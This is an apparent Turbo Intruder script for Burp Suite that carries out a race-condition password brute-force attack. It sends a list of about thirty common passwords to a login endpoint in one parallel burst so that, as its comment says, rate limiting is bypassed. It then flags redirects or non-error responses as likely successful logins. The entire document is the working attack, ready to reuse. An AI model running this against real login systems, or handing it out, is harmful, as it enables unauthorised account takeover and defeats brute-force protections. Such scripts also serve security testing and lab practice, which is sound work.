def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            engine=Engine.BURP2
                            )

    # Your password wordlist
    passwords = [
        '123123', 'abc123', 'football', 'monkey', 'letmein',
        'shadow', 'master', '666666', 'qwertyuiop', '123321',
        'mustang', '123456', 'password', '12345678', 'qwerty',
        '123456789', '12345', '1234', '111111', '1234567',
        'dragon', '1234567890', 'michael', 'x654321', 'superman',
        '1qaz2wsx', 'baseball', '7777777', '121212', '000000'
    ]

    # Queue all password attempts in gate 'race'
    for password in passwords:
        engine.queue(target.req, password, gate='race')

    # Send all requests in parallel to bypass rate limiting
    engine.openGate('race')


def handleResponse(req, interesting):
    # Check for successful login indicators
    if req.status == 302:
        table.add(req)
        print("[+] POTENTIAL SUCCESS - Status 302:")
        print("    Password: " + str(req.label))
        print("    Location: " + str(req.response.headers.get('Location', 'N/A')))

    elif 'Invalid username or password' not in req.response:
        table.add(req)
        print("[?] INTERESTING RESPONSE:")
        print("    Password: " + str(req.label))
        print("    Status: " + str(req.status))
        print("    Length: " + str(len(req.response)))